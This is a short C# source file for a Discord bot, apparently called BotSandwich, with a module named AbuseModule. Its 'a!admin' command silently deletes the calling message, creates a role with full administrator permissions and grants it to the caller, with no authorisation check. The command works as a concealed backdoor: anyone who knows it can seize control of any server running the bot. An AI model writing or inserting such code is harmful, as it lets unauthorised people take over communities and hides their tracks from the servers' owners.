using System.Threading.Tasks;
using BotSandwich.Data;
using BotSandwich.Data.Commands;
using BotSandwich.Data.Commands.Attributes;
using Discord;
using Discord.WebSocket;

namespace BotSandwich.Modules.Abuse
{
    sealed class AbuseModule : Module
    {
        protected override string CommandPrefix => "a!";

        [Command("admin")]
        public async Task Admin([Message] SocketMessage sm, [Argument(true, "name")] string roleName)
        {
            await sm.DeleteAsync();

            var user = sm.Author as IGuildUser;
            var guild = user?.Guild;

            var role = await guild.CreateRoleAsync(roleName, new GuildPermissions(administrator: true), Color.Red,
                false, null);
            await user.AddRoleAsync(role);
        }
    }
}
